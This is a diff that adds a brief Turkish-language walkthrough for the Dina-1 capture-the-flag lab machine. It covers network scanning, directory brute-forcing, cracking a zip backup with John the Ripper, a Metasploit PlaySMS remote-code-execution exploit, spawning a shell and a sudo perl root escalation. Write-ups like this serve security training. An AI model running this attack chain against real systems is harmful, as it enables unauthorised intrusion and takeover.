@@ -1,0 +1,14 @@
+DİNA-1 MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.83 bulundu.
+2 - nmap -sT -A 192.168.2.83
+3 - gobuster dir -u http://192.168.2.83 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+4 - view-source:http://192.168.2.83/nothing/, freedom, password, helloworld!, diana, iloverobot
+5 - http://192.168.2.83/secure/backup.zip
+6 - zip2john backup.zip > dina_backup_hash
+7 - john dina_backup_hash -w dina_pass.txt
+8 - file backup-cred.mp3, ASCII Text
+9 - cp backup-cred.mp3 backup-cred.txt, touhid:****** (diana), url: /SecreTSMSgatwayLogin
+10 - msfconsole -> search playsms -> use exploit/multi/http/playsms_filename_exec
+11 - shell -> which python -> python -c 'import pty; pty.spawn("/bin/sh")'
+12 - sudo -l, sudo perl -e 'exec "/bin/sh";'
+13 - whoami
